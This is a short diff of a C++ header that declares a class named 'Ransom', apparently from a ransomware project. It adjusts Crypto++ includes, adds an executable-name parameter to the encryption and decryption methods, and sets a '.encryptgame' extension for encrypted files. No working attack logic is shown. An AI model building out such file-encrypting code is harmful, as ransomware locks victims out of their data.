@@ -1,17 +1,16 @@
 #pragma once
 
-#include <files.h>
-#include <osrng.h>
 #include <filesystem>
 #include "../cryptopp/modes.h"
+#include "../cryptopp/osrng.h"
 
 class Ransom
 {
 public:
 	Ransom() = default;
 	~Ransom() = default;
-	void run_encryption_logic();
-	void run_decryption_logic();
+	void run_encryption_logic(const char* exe_file_name);
+	void run_decryption_logic(const char* exe_file_name);
 
 private:
 	const char* custom_extension_name = ".encryptgame";
